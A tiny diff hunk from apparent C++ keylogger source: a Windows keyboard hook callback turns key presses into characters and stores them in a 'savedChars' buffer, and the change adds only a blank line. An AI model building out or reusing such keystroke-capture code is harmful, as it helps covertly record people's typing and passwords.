@@ -48,6 +48,7 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 		//	curCharStr += "c";
 
 		int curCharInt = handleCharsFinal(vk, is_shift_on);
+
 		savedChars.push_back(curCharInt);
 
 #ifndef USE_ADMIN
